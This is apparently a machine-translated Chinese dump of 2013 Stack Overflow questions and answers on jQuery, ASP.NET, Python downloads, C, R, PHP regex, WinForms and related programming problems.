```

[**工作演示**](http://jsfiddle.net/mohammadAdil/wGqKc/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-18T19:46:19.183

只需找到 tbody 的孩子。想象“数据”变量包含通过 ajax 接收到的数据：

```
var $shard = $(data).children();

$('.something').append($shard); 
```

解释：

```
$(data) // creates the dom shard.
$(data).children(); // selects it's children, which is everything except the tbody 
```

# asp.net - asp.net中的文本框链接预览

> ID：16091724
> 
> 赞同：-1
> 
> 时间：2013-04-18T19:43:25.770
> 
> 标签：asp.net, textbox, migration

我必须创建一个类似于 facebook 的链接和视频共享应用程序。我试图在任何教程/演示/代码片段中搜索相同的内容。php中有很多教程可以做到这一点

*   [链接 1](https://stackoverflow.com/questions/4646147/is-there-open-source-code-for-making-link-preview-text-and-icons-like-in-face)
*   [链接 2](http://www.99points.info/2010/07/facebook-like-extracting-url-data-with-jquery-ajax-php/)
*   [链接 3](https://stackoverflow.com/questions/1868544/is-there-a-library-that-emulates-facebooks-link-detect)
*   [链接 4](http://lab.leocardz.com/facebook-link-preview-php--jquery/)

不幸的是，我没有找到任何关于 ASP.NET 的教程。我还尝试将 php 代码转换为 asp.net，但由于我对 PHP 的*零*级知识，我无法完全转换它。我确实安装[了 PHP 到 ASP.NET 1.x 迁移](http://www.asp.net/downloads/archived-v11/migration-assistants/php-to-aspnet)，但根据教程，它没有反映在 VS2005、VS2008 和 VS2010 上。

谁能指导我如何用 asp.net 实现相同的功能？或者我如何将现有代码从 php 转换为 asp.net？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T22:15:46.210

PHP 是一门非常容易上手的语言，当然也不能在没有大量返工的情况下转换为 asp.net，因为概念模型完全不同。

我建议您查看[php.net](http://php.net/)站点，特别是[语言参考区](http://www.php.net/manual/en/langref.php)。该站点是了解 php 的去处。您可能还想从一个[简单的示例](http://www.php.net/manual/en/tutorial.firstpage.php)开始，然后从那里开始工作。这样您就可以开始阅读现有代码以了解每个函数调用的含义。

好消息是 php 和 c# 共享相同的根语言，因此`foreach`两者之间的工作方式几乎相同。

在你经历了一些之后，回来并发布一个关于你遇到的特定问题或你不理解的 php 代码的特定区域的问题。

最后，如果您愿意寻找一个这样做的项目，其唯一要求是使用 json，然后查看[http://embed.ly](http://embed.ly)

# javascript - 将数组值传递给函数

> ID：16091742
> 
> 赞同：0
> 
> 时间：2013-04-18T19:44:33.500
> 
> 标签：javascript, jquery, arrays, for-loop

在下面的脚本中，console.log 正在返回正确的值，并且两个警报都会触发。但是，该值未定义。

任何想法我做错了什么？

```
jQuery(document).ready(function(){

    jQuery("#customfield_21070").attr('style','width:60px');
    jQuery("#customfield_21070").attr('disabled','disabled');

    var customfields = [
    '#customfield_11070',
    '#customfield_11071',
    '#customfield_20071',
    '#customfield_20072',   
    '#customfield_20073',
    '#customfield_20074',
    ];

    for(var i=0, len=customfields.length; i<len; i++) {
        console.log(customfields[i]);
        jQuery(customfields[i]).keyup(function(){
            alert('calculate');//FIRES
            calculateSum();
        });
    }

    function calculateSum() {

        var sum = 0;

        alert('value: ' + this.value);//UNDEFINED

        if(!isNaN(this.value) && this.value.length!=0 && this.id !== "customfield_21070") {
            sum += parseFloat(this.value);
        }

        jQuery("#customfield_21070").val(sum.toFixed(2));
    }

}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T19:49:50.143

使用[`Function.prototype.call()`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Function/call)：

> 调用具有给定`this`值和单独提供的参数的函数。

它的第一个参数是`thisArg`：

> `this`为有趣的调用提供的值。注意，`this`可能不是方法看到的实际值：如果方法是非严格模式代码中的函数，null 和 undefined 将被替换为全局对象，原始值将被装箱。

所以，`this`从你的处理函数传递到`calculateSum`这样：

```
jQuery(customfields[i]).keyup(function(){
    calculateSum.call(this);
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T19:54:59.730

`@canon`是绝对正确的，按照他所说的将解决您的问题。

你可以写： -

```
jQuery(document).ready(function () {

            jQuery("#customfield_21070").attr('style', 'width:60px');
            jQuery("#customfield_21070").attr('disabled', 'disabled');

            var customfields = [
            '#customfield_11070',
            '#customfield_11071',
            '#customfield_20071',
            '#customfield_20072',
            '#customfield_20073',
            '#customfield_20074',
            ];

            for (var i = 0, len = customfields.length; i < len; i++) {
                jQuery(customfields[i]).keyup(function () {
                    calculateSum(this);//Edited
                });
            }

            function calculateSum(param) {//Edited

                var sum = 0;

                alert('value: ' + param.value);//UNDEFINED

                if (!isNaN(param.value) && param.value.length != 0 && param.id !== "customfield_21070") {//Edited
                    sum += parseFloat(param.value);
                }

                jQuery("#customfield_21070").val(sum.toFixed(2));
            }

        }); 
```

这反映了您的`alert`.`**Tested**`

# python - Python自动化一个需要登录的wget脚本

> ID：16091745
> 
> 赞同：1
> 
> 时间：2013-04-18T19:44:42.763
> 
> 标签：python, post, cookies

我需要从需要以下内容的站点自动执行下载过程：

*   发送包含您的用户名和密码的 HTTP POST 请求
*   我应该得到一个 cookie *（可能包含一个会话 ID）*
*   发送文件的 HTTP GET 请求，在 HTTP 标头中发送我的 cookie 详细信息

现在使用 wget，我必须首先使用密码登录*（打开会话？）*：

```
wget --no-check-certificate -O /dev/null --save-cookies auth.rda_ucar_edu --post-data=email=name@domain.edu&passwd=5555&action=login https://rda.ucar.edu/cgi-bin/login 
```

然后，我检索我需要的文件：

```
wget --no-check-certificate -N --load-cookies auth.rda_ucar_edu http://rda.ucar.edu/data/ds608.0/3HRLY/1979/NARRflx_197901_0916.tar 
```

在 Python 中有没有很好的方法来做到这一点？我已经尝试了很多方法，但没有得到这个工作。以下 python 代码似乎让我正确登录。但是，我认为我需要在下载数据时保持会话处于活动状态？

```
url = 'https://rda.ucar.edu/cgi-bin/login'
values = {'email': 'name@domain.edu', 'password': '5555', 'action': 'login'}
data = urllib.urlencode(values)
binary_data = data.encode('ascii')
req = urllib2.Request(url, binary_data)
response = urllib2.urlopen(req)
print response.read() 
```

也试过这个：

```
from requests import session
with session() as c:
    c.post(url, values)
    request = c.get('http://rda.ucar.edu/data/ds608.0/3HRLY/1979/NARRflx_197901_0108.tar') 
```

任何建议都会有所帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T20:22:36.477

你需要[保存你的cookies](http://docs.python.org/2/library/cookielib.html)。

虽然更容易使用[mechanize](http://www.pythonforbeginners.com/cheatsheet/python-mechanize-cheat-sheet/)或[scrapy这样的 3rd 方库](http://scrapy.org/)

# c# - 如何为通常是选项集的实体属性自动生成早期绑定的枚举属性？

> ID：16091747
> 
> 赞同：5
> 
> 时间：2013-04-18T19:44:48.710
> 
> 标签：c#, dynamics-crm-2011, code-generation

为 CRM 实体生成早期绑定的实体类相当简单。为选项集生成枚举也相当简单。为键入正确 Enum 的实体生成 OptionSet Enum 属性并不是那么简单，CrmSrvUtil.exe 目前不支持。如果您希望能够使用枚举来填充选项集值，则必须不断编写如下所示的代码：

```
contact.Address1_AddressTypeCode = new OptionSetValue((int)contact_address1_addresstypecode.Home); 
```

如何为 生成 Enum 特定属性`OptionSetValues`，因此我可以编写如下代码：

```
contact.Address1_AddressTypeCode = contact_address1_addresstypecode.Home; 
```

所以`Address1_AddressTypeCode's`类型是`contact_address1_addresstypecode`？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-04-17T13:26:17.263

我以前的答案很糟糕......改用这个： CRM Disclamer[的早期绑定生成器：我也写了它。](https://github.com/daryllabar/DLaB.Xrm.XrmToolBoxTools/releases)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-18T19:44:48.710

我创建了一个 Entity OptionSet Enum Mapper Utility 来为早期绑定实体自动生成 Enum 特定类型的属性。您可以在此处下载源代码和可执行文件：

[以编程方式为 OptionSet 枚举生成属性](http://www.dotnetdust.blogspot.com/2013/04/programmatically-generating-properties.html)

它基本上在构建标准选项集/枚举 dll 期间作为预构建事件的一部分运行，生成一个 .cs 文件，其中包含需要为其生成 Enum 属性的任何类的部分类。

# r - 矩阵 R 中的 [] 运算符

> ID：16091753
> 
> 赞同：2
> 
> 时间：2013-04-18T19:45:03.510
> 
> 标签：r, matrix, indexing

所以我知道，如果你有：

```
m = matrix(1:9, 3,3)
z = as.matrix(expand.grid(1:3, 1:3)) 
```

你也是

```
m[z] 
# you get back 1 2 3 4 5 6 7 8 9 
```

但如果你这样做

```
m[] = m[z]
# You get back a matrix.. 
```

我有点困惑这个`[]`操作员是做什么的？为什么不喜欢`m[][z]`或`m[z][]`返回矩阵？以及如何让它返回一个矩阵**而不**将它分配给一个变量`m[]`

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:56:46.017

这里的关键是，当“[]”（实际上是一个函数）的参数是您提供的两列矩阵时，结果将是一个向量，其中第一列指定行，第二列指定列操作矩阵。这是该语言的一个“功能”（我可能会添加一个非常方便的功能）。

参数可能包含也可能不包含行和列的所有可能组合，因此结果不会是可以预见的相同维度的矩阵。形式：`m[] <- m[ z[1:4, ] ]`将产生结果但也会产生警告。您应该查看结果，然后努力了解正在发生的事情。

# c# - 编辑 winForm VS2012 时丢失 UserControl

> ID：16091754
> 
> 赞同：4
> 
> 时间：2013-04-18T19:45:12.370
> 
> 标签：c#, winforms, visual-studio, visual-studio-2012, devexpress

我`EmployeeForm`在这个表单中调用了一个表单，其中包含一些 UserControl，当我编辑`EmployeeForm`表单内的每个 UserControl 时，都会丢失。

此图显示修改组合框名称后 TFS（左）和本地（右）文件之间的差异

![在此处输入图像描述](https://i.stack.imgur.com/jFneX.jpg)

this.ucEmployeeKeyOne 的示例：

```
public partial class Employee_EmployeeKeyOneRelationUC
    : Employee_EmployeeKeyOneRelation_GenericUC
{ [other Code Here] }

public class Employee_EmployeeKeyOneRelation_GenericUC
    : RelationUC<MyObject>
{ } 
```

以及 RelationUC 的定义：

```
public partial class RelationUC<T>
    : DataUserControlBase
{ [other Code Here] }

public partial class DataUserControlBase
   : UserControlBase
{ [other Code Here] }

public partial class UserControlBase
   : System.Windows.Forms.UserControl, MyInterfaceHere
{ [other Code Here] } 
```

`UserControl`我失去的一切都是从`RelationUC<T>`. RelationUC 的泛型类型是否会导致问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-05-01T13:24:35.290

为了让 Vs 设计器加载控件，控件应该能够初始化，包括所有公共属性，并且您必须有一个空的构造函数。如果您没有空的构造函数或具有从继承的可为空类返回的属性，则设计器很可能会崩溃。

要调试这个，

1）在VS中打开你的项目，但不要打开包含控件的文件；

2）打开另一个VS，并附上你的项目打开的VS的进程；

3）将异常中断（快捷方式 ' `CTRL`+ `D`，`CTRL`+ `E`' ）设置为所有（一旦您熟悉了设计者抛出的异常，您就可以只设置该异常。）；

4）带着你的项目去VS并打开包含你的用户控件的文件。当抛出异常时，第二个 VS 将捕获它并告诉您确切的原因和位置。

# c# - 使用 Xamarin.iOS 使用自定义字体宽度呈现字体

> ID：16091755
> 
> 赞同：0
> 
> 时间：2013-04-18T19:45:12.543
> 
> 标签：c#, ios6, fonts, xamarin.ios

我正在使用 Xamarin.iOS 并且需要呈现在每个 gylph 之间具有自定义间距的文本字符串。我目前正在构建一个 NSMutableAttributedString，我在其中传递我的字体和段落样式信息。我能够显示文本字符串，但我需要能够设置每个字形之间的自定义间距量。是否可以添加一个字典元素以允许我在 iOS 中配置此值？下面是我用来构建属性字符串的方法。

```
public NSMutableAttributedString Build()
{
    // Create a new attributed string from text
    var atts = new NSMutableAttributedString(String);

    var attRange = new NSRange(0, atts.Length);
    var attsDic = new NSMutableDictionary();

    var fontObject = new NSObject(Font.Handle);
    attsDic.Add((NSString)"NSFont", fontObject);

    var alignmentSettings = new CTParagraphStyleSettings()
    {
        Alignment = CTTextAlignment.Left,
    };

    var paragraphStyle = new CTParagraphStyle(alignmentSettings);
    var psObject = new NSObject(paragraphStyle.Handle);

    attsDic.Add((NSString)"NSParagraphStyle", psObject);
    atts.SetAttributes(attsDic, attRange);

    return atts;
} 
```

# tsql - SSRS 文本框输入限制字符

> ID：16091756
> 
> 赞同：0
> 
> 时间：2013-04-18T19:45:14.093
> 
> 标签：tsql, reporting-services, ssrs-2008, business-intelligence

我正在寻找一种方法来限制 SSRS 参数的文本框的条目大小。报表正在 ReportServer 2008 中呈现。需要明确的是，这不是报表中呈现的文本框。

该报告接受有限数量的字符进行文本搜索，我希望表示层与报告/SQL 逻辑条目限制相匹配。我不想将 100 个字符传递给 VARCHAR(20) 字段并产生静默错误。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T20:19:14.607

没有直接限制长度的选项。一种可能的解决方案是让报告返回一条警告消息，指示参数太长，而不是运行查询。您可以通过在相关参数后添加一个隐藏参数来执行此操作，该参数用作确定报表上对象可见性的标志。

# wxwidgets - 如何在 wxListCtrl 中获取特定的单元格内容

> ID：16091757
> 
> 赞同：0
> 
> 时间：2013-04-18T19:45:14.390
> 
> 标签：wxwidgets

正如标题所说，谁能给我一个简单的例子，如何在 wxListCtrl 中获取特定单元格的内容。

比如我建了一个wxListCtrl列表，可能有3列。当我右键单击或双击一行时，它应该会弹出一个消息框，告诉我该选定行的第三列中的内容？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T22:20:03.520

使用[wxListCtrl::GetItemText()](http://docs.wxwidgets.org/trunk/classwx_list_ctrl.html#ab0a596e1ad4714b6d5ee7b3180c59680)检索单元格的内容。

# javascript - 在迭代问题上微风多对多关系并将 Aspect 设置为“setDeleted”

> ID：16091761
> 
> 赞同：1
> 
> 时间：2013-04-18T19:45:35.503
> 
> 标签：javascript, knockout.js, kendo-ui, breeze

我的目标是将用户选择保存在 KendoUIWeb-Multiselect 的多选列表中。我觉得跟踪列表更改的最简单方法就是删除多对多关系中的所有内容并添加新选择的项目。当我遍历多对多关系并将每个实体的方面设置为“setDeleted”时，迭代开始通过循环传递“未定义”对象。从表面上看，设置一个连词对象删除似乎会影响 Breeze 中列表中的其他对象。还有另一种方法可以迭代地删除所有连接对象吗？

注意：如果我不调用此方法，我可以毫无问题地遍历合取模型。

```
public class Course
{
    public int Id { get;set; }
    public string Name { get;set; }
}
public class Student
{
    public int Id { get; set; }
    public string Name { get; set; }
}
public class StudentCourse
{
    public int StudentId { get;set; }
    public virtual Student Student { get;set; }
    public int CourseId { get;set; }
    public virtual Course Course { get;set; }
} 
```

以下代码完美运行（为 KendoUI 多选设置多选下拉菜单）：

```
 var getSelectedCourses = function () {
        var selected = [];
        ko.utils.arrayForEach(student().studentCourses(), function(course) {
            var courseId = parseInt(course.courseId());
            selected.push(courseId);
        });
        return selected;
    }; 
```

该问题体现在以下代码中。前几次迭代似乎很好，但之后“*未定义*”作为“课程”参数传递

```
 var removeListItems = function () {
        if (courseHasChanges()) {
            //Remove all list items
            ko.utils.arrayForEach(student().studentCourses(), function(studentCourse) {
                if (studentCourse) { //passing undefined after 2nd or 3rd iteration
                    studentCourse.entityAspect.setDeleted();
                }
            });
        }
    }; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T04:23:01.360

我相信 Breeze 将从`studentCourses()`数组中删除课程，因为您正在遍历它调用`setDeleted()`.

也许使用`slice(0)`克隆原始`studentCourses()`数组可能有效：（未测试）

```
var removeListItems = function () {
    if (courseHasChanges()) {
        //Remove all list items
        ko.utils.arrayForEach(student().studentCourses().slice(0), function(course) {
            if (course) { //passing undefined after 2nd or 3rd iteration
                course.entityAspect.setDeleted();
            }
        });
    }
}; 
```

# c# - 如何定义主详细信息的模型属性

> ID：16091766
> 
> 赞同：1
> 
> 时间：2013-04-18T19:45:53.050
> 
> 标签：c#, asp.net-mvc

我有一个帖子模型，它需要为每个帖子定义 category 和 tag ，并且从 category 或 tag 我想到达所有具有该标签类别的帖子。这是我的博客模型

```
 public class Post
    {
        public Guid Id { get; set; }
        public string Title { get; set; }
        public string Body { get; set; }
        public string Summary { get; set; }
        public DateTime CreationDate { get; set; }
        public string UrlSlug { get; set; }

        public Category Category { get; set; }
        public Tag Tag { get; set; }
     } 
```

这是类别：

```
public class Category
    {
        public Guid Id { get; set; }
        public string Name { get; set; }
        public string UrlSlug { get; set; }
        public string Description { get; set; }
        public DateTime CreationDate { get; set; }

        public IList<Post> Posts { get; set; }
    } 
```

最后是这个标签模型：

```
public class Tag
    {
        public Guid Id { get; set; }
        public string Name { get; set; }
        public string UrlSlug { get; set; }
        public string Description { get; set; }
        public DateTime CreationDate { get; set; }

        public IList<Post> Posts { get; set; } 
    } 
```

我只是想知道我在设计模型时所做的是否正确？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T21:08:57.220

您不需要模型中的列表（ remove public IList Posts { get; set; }

首先在控制器中创建两个获取标签 ID 和另一个类别 ID 的操作。在此操作中获取所有帖子并填充您的视图（详细视图）

```
public ActionResult PostsByCategoryID(Guid Id)
{

  List<post> posts = ///get them by id

 return View(posts) ; //the view take list and displays the posts
} 
```

# c - 用C编程取一个词组，改成莫尔斯电码

> ID：16091768
> 
> 赞同：-2
> 
> 时间：2013-04-18T19:45:59.467
> 
> 标签：c, morse-code

我正在编写一个程序来获取用户输入并将其转换为摩尔斯电码作为输出。我的程序中出现了一些错误。我不确定我应该做什么或从这里尝试。我已经完成了从字母表到莫尔斯电码的转换。我从使用字母切换到二进制输入，因为它不喜欢字母。

我试图扫描短语并使用字符串将其存储在其中。然后使用 for 循环将 string[i] 每个循环增加 1，以便检查字符串的每个地址。每次循环运行时，它将字符串值存储在 INT A 中，然后检查 if= else - if 语句是否匹配并返回并打印该值。

```
# include <stdio.h>

void checkphrase ( char string[], int *px)

{
int i;
printf(" PHRASE ENTERED IS\n %s\n" , string[i]);
/* Prints the Phrase entered */

/* Start for loop to compare letters to the morse code equivalent */

for( i=0; i <= 30; i++) 
    {
        px = string[i];     // pointer points the string value
        a = px;         // int a is assgined the value of px to be     compared to morsecode
        findmorse()     // calls function to compare morsecode
    }
return 0;               // returns to main 

}

void findmorse (int a)
/* originoally had a = the aphpabet but converted to binary */
{
if (a == 01000001)
    Printf(" • —  \n");
else if (a == 01000010)
    Printf(" — • • •  \n");
else if (a == 01000011)
    Printf(" — • — •  \n");
else if (a == 01000100)
    Printf(" — • •  \n");
else if (a == 01000101)
    Printf(" •   \n");
else if (a == 01000110)
    Printf(" • • — • \n");
else if (a == 01000111)
    Printf(" — — •  \n");
else if (a == 01001000)
    Printf(" • • • • \n");
else if (a == 01001001)
    Printf(" • •  \n");
else if (a == 01001010)
    Printf(" • — — —  \n");
else if (a == 01001011)
    Printf(" — • —  \n");
else if (a == 01001100)
    Printf(" • — • • \n");
else if (a == 01001101)
    Printf(" — —  \n");
else if (a == 01001110)
    Printf(" — •  \n");
else if (a == 01001111)
    Printf(" — — —  \n");
else if (a == 01010000)
    Printf(" • — — •  \n");
else if (a == 01010001)
    Printf(" — — • —  \n");
else if (a == 01010010)
    Printf(" • — •  \n");
else if (a == 01010011)
    Printf(" • • •  \n");
else if (a == 01010100)
    Printf(" —  \n");
else if (a == 01010101)
    Printf(" • • —  \n");
else if (a == 01010110)
    Printf(" • • • —  \n");
else if (a == 01010111)
    Printf(" • --  \n");
else if (a == 01011000)
    Printf(" -• • -  \n");  
else if (a == 01011001)
    Printf(" -• --  \n");
else if (a == 01011010)
    Printf(" --• •  \n");

/* Numbers */

else if (a == 1)
    Printf(" · – – – –  \n");
else if (a == 2)
    Printf(" · · – – –  \n");
else if (a == 3)
    Printf(" · · · – –  \n");
else if (a == 4)
    Printf(" · · · · –  \n");
else if (a == 5)
    Printf(" · · · · · \n");
else if (a == 6)
    Printf(" – · · · ·  \n");
else if (a == 7)
    Printf(" – – · · ·  \n");
else if (a == 8)
    Printf(" – – – · · \n");    
else if (a == 9)
    Printf(" – – – – ·  \n");
else if (a == 0)
    Printf(" – – – – –  \n");

/* return to check phrase */

return string[};
}

int main()                          // main function

{
printf("PLEASE ENTER A PHRASE UNDER 30 CHARACTERS\n");
scanf(" %s " , string[]);
checkphrase ()                      // takes string to the    checkphrase function
return 0;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T20:21:32.180

`findmorse`需要一个论据。

```
void findmorse (int a) 
```

在`checkphrase`中，你没有一个就叫它。

```
 px = string[i];     // pointer points the string value
        a = px;         // int a is assgined the value of px to be     compared to morsecode
        findmorse()     // calls function to compare morsecode 
```

在`main`你的函数参数中有奇怪的括号。

```
 scanf(" %s " , string[]); 
```

然后`checkphrase`可能需要一些声明为接收的参数`;`以及表达式语句的终止分号 ( )。

```
checkphrase ()                      // takes string to the    checkphrase function 
```

您需要启用（或注意）编译器警告 ( `gcc -Wall -Wextra`)。

# jsf-2 - JSF2 提取 URL 参数

> ID：16091772
> 
> 赞同：0
> 
> 时间：2013-04-18T19:46:22.517
> 
> 标签：jsf-2, primefaces

我正在使用 primefaces 菜单栏，并且根据所选的菜单项，我想在 URL (GET) 中传递一个不同的参数

```
<ui:composition>
    <h:form rendered="#{facesContext.externalContext.userPrincipal != null}">
        <p:menubar>
            <p:menuitem value="#{msg['menu.home']}" url="/index.xhtml" />
            <p:submenu label="#{msg['menu.maintenance']}" >
                <p:menuitem id="client" value="#{msg['menu.clients']}" action="/person/newPerson?faces-redirect=true" ajax="false" includeViewParams="true">
                     **<f:param name="type" value="client"/>**
                </p:menuitem>
                <p:menuitem id="supplier" value="#{msg['menu.suppliers']}" action="/person/newPerson?faces-redirect=true" ajax="false" >
                    **<f:param name="type" value="supplier"/>**
                </p:menuitem>
            </p:submenu> 
```

This way when the menuitem "client" is selected I would like to use the GET parameter "type=client" in the newPerson.xhtml like so:

```
<h:outputText value="Parameter: #{param['type']}" /> 
```

但是，没有在 URL 中传递任何参数。有人可以告诉我我的代码有什么问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T20:07:35.920

Instead of action attribute try URL

```
<p:menuitem id="client" value="#{msg['menu.clients']}" url="/person/newPerson?faces-redirect=true&type=client" ajax="false" includeViewParams="true">
</p:menuitem> 
```

# php - PHP Preg 匹配捕获组

> ID：16091776
> 
> 赞同：1
> 
> 时间：2013-04-18T19:46:30.227
> 
> 标签：php, html, regex, multidimensional-array, preg-match

我似乎无法掌握 php 中的正则表达式。具体来说，组捕获部分。

我有一个看起来像这样的字符串

```
<table cellpadding="0" cellspacing="0" border="0" width="100%" class="List">

  <tr class='row_type_1'>
    <td class="time">
                      3:45 pm
    </td>
    <td class="name">
                      Kira
    </td>
  </tr>

  <tr class='row_type_2'>
    <td class="time">
                      4:00 pm
    </td>
    <td class="name">
                      Near
    </td>
  </tr>

</table> 
```

我希望我的数组看起来像这样

```
Array
(
   [0] => Array
   (
      [0] => 3:45 pm
      [1] => Kira
   )
   [1] => Array
   (
      [0] => 4:00 pm
      [1] => Near
   )
) 
```

我只想使用 preg_match，而不是explode，array_keys 或循环。我花了一段时间才发现我需要一个 /s 来表示 .* 来计算换行符；我真的很想看到模式和捕获语法。

编辑：该模式只需要像 (row_type_1|row_type_2) 这样的东西来捕获我想要从中获取数据的表中仅有的两种类型的行。例如，在 row_type_2 之后是 row_type_3，然后是 row_type_1，然后 row_type_3 将被忽略，数组只会添加来自 row_type_1 的数据，如下所示。

```
Array
(
   [0] => Array
   (
      [0] => 3:45 pm
      [1] => Kira
   )
   [1] => Array
   (
      [0] => 4:00 pm
      [1] => Near
   )
   [2] => Array
   (
      [0] => 5:00 pm
      [1] => L
   )
) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T19:58:31.883

我会使用 XPath 和 DOM 从 HTML 中检索信息。如果 HTML 或查询变得更复杂，为此使用正则表达式可能会变得混乱。（如您目前所见）。DOM 和 XPath 是这方面的标准。为什么不使用它？

想象一下这个代码示例：

```
// load the HTML into a DOM tree
$doc = new DOMDocument();
$doc->loadHtml($html);

// create XPath selector
$selector  = new DOMXPath($doc);

// grab results
$result = array();
// select all tr that class starts with 'row_type_'
foreach($selector->query('//tr[starts-with(@class, "row_type_")]') as $tr) {
    $record = array();
    // select the value of the inner td nodes
    foreach($selector->query('td[@class="time"]', $tr) as $td) {
        $record[0]= trim($td->nodeValue);
    }
    foreach($selector->query('td[@class="name"]', $tr) as $td) {
        $record[1]= trim($td->nodeValue);
    }
    $result []= $record;
}

var_dump($result); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T20:08:58.633

出于几个原因，您不应该使用正则表达式解析 html。最大的原因是很难解释格式不正确的 html 并且可能会变得大而缓慢。

我建议研究使用 php DOM 解析器或 php HTML 解析器。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-18T20:42:49.553

尝试这个：

```
function extractData($str){
    preg_match_all("~<tr class='row_type_\d'>\s*<td class=\"time\">(.*)</td>\s*<td class=\"name\">(.*)</td>\s*</tr>~Usim", $str, $match);
    $dataset = array();
    array_shift($match);
    foreach($match as $rowIndex => $rows){
        foreach ($rows as $index => $data) {
            $dataset[$index][$rowIndex] = trim($data);
        }
    }
    return $dataset;
}

$myData = extractData($str); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-19T00:56:49.560

地狱之路在这里：

```
$pattern = '`<tr .*?"time">\s++(.+?)\s++</td>.*?"name">\s++(.+?)\s++</td>`s';
preg_match_all($pattern, $subject, $matches, PREG_SET_ORDER);
foreach ($matches as &$match) {
    array_shift($match);
}
?><pre><?php print_r($matches); 
```

# c# - 将 img 元素作为返回值传递

> ID：16091777
> 
> 赞同：0
> 
> 时间：2013-04-18T19:46:42.433
> 
> 标签：c#, javascript, windows-phone-8

我正在开发 html5 WP8 应用程序。在 html/js 方面，我收集了一些数据（文本和图像），我应该将它们发送到 c# 以通过电子邮件转发。我在 javascript 中有函数

```
function toEmail() {
var dataToSend = getNextEntry();
return dataToSend;
} 
```

我从 c# 调用它

```
string toBeEmailed;
toBeEmailed = (string)Browser.invokeScript("toEmail"); 
```

这很好用。但是现在我应该对存储在 img.src 中的图像做同样的事情。我怎样才能做到这一点？我应该转换返回值等的数据类型。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T21:03:16.577

使用可以将图像作为 base64 字符串。

例如：

```
function img2base64(img)
{
    var canvas = document.createElement("canvas");
    canvas.width = img.width;
    canvas.height = img.height;

    var context = canvas.getContext("2d");
    context.drawImage(img, 0, 0, img.width, img.height);

    return canvas.toDataURL("image/jpeg"));
} 
```

# python - 有没有办法避免这种内存错误？

> ID：16091781
> 
> 赞同：10
> 
> 时间：2013-04-18T19:46:54.070
> 
> 标签：python, memory, pypy

我目前正在解决 Project Euler 上的问题，到目前为止，我已经想出了这个代码来解决问题。

```
from itertools import combinations
import time

def findanums(n):
    l = []
    for i in range(1, n + 1):
        s = []
        for j in range(1, i):
            if i % j == 0:
                s.append(j)
        if sum(s) > i:
            l.append(i)
    return l

start = time.time() #start time

limit = 28123

anums = findanums(limit + 1) #abundant numbers (1..limit)
print "done finding abundants", time.time() - start

pairs = combinations(anums, 2)
print "done finding combinations", time.time() - start

sums = map(lambda x: x[0]+x[1], pairs)
print "done finding all possible sums", time.time() - start

print "start main loop"
answer = 0
for i in range(1,limit+1):
    if i not in sums:
        answer += i
print "ANSWER:",answer 
```

当我运行这个时，我遇到了一个`MemoryError`.

追溯：

```
File "test.py", line 20, in <module>
    sums = map(lambda x: x[0]+x[1], pairs) 
```

我试图通过禁用我从谷歌获得的垃圾收集来阻止它，但无济于事。我是以错误的方式接近这个吗？在我看来，这感觉是最自然的方式，我现在不知所措。

旁注：我正在使用 PyPy 2.0 Beta2（Python 2.7.4），因为它比我使用过的任何其他 python 实现都快得多，而且 Scipy/Numpy 已经超出了我的想象，因为我还刚刚开始编程和我没有工程学或强大的数学背景。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-18T20:30:06.060

正如凯文在评论中提到的那样，您的算法可能是错误的，但无论如何您的代码并未优化。

当使用非常大的列表时，通常使用`generators`，有一个著名的、很棒的 Stackoverflow 答案解释了`yield`和的概念`generator`—— [“yield”关键字在 Python 中的作用是什么？](https://stackoverflow.com/questions/231767/the-python-yield-keyword-explained)

问题是您`pairs = combinations(anums, 2)`不会生成 a `generator`，而是生成一个消耗更多内存的大对象。

我将您的代码更改为具有此功能，因为您只对集合进行了一次迭代，您可以懒惰地评估这些值：

```
def generator_sol(anums1, s):
      for comb in itertools.combinations(anums1, s):
        yield comb 
```

现在代替`pairs = combinations(anums, 2)`which 生成一个大对象。利用：

```
pairs = generator_sol(anums, 2) 
```

然后，而不是使用`lambda`我会使用另一个`generator`：

```
sums_sol = (x[0]+x[1] for x in pairs) 
```

另一个提示，您最好查看更合适的[xrange](http://docs.python.org/2/library/functions.html#xrange)，它不会生成列表，而是`xrange object`在许多情况下（例如此处）更有效。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-18T20:40:21.453

让我建议你使用[generators](http://wiki.python.org/moin/Generators)。尝试改变这个：

```
sums = map(lambda x: x[0]+x[1], pairs) 
```

至

```
sums = (a+b for (a,b) in pairs) 
```

Ofiris 解决方案也可以，但意味着`itertools.combinations`在错误时返回一个列表。如果您要继续解决项目欧拉问题，请查看[itertools 文档](http://docs.python.org/2/library/itertools.html)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-18T20:37:02.360

问题是 anums 很大——大约有 28000 个元素长。所以对必须是 28000*28000*8 字节 = 6GB。如果您使用 numpy，您可以将 anums 转换为 numpy.int16 数组，在这种情况下，结果对将是 1.5GB - 更易于管理：

```
import numpy as np
#cast
anums = np.array([anums],dtype=np.int16)
#compute the sum of all the pairs via outer product
pairs = (anums + anums.T).ravel() 
```

# jakarta-ee - 在 EJB 中使用事务类型

> ID：16091784
> 
